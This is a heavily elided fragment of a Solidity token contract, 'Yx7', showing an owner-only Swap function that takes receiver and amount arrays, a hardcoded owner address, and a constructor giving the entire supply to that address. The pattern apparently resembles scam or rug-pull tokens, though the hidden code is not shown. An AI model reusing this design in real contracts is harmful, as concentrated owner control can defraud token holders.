...
contract Yx7 is Context, IERC20 {
  ...
  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    ...
    address public _Owner = 0x246Ba94c4b261B74905593e73A3B91532789bBb7;
    ...
    constructor () public {
        ...
        team = 0x246Ba94c4b261B74905593e73A3B91532789bBb7;
        release(team, initialSupply*(10**_decimals));
    }
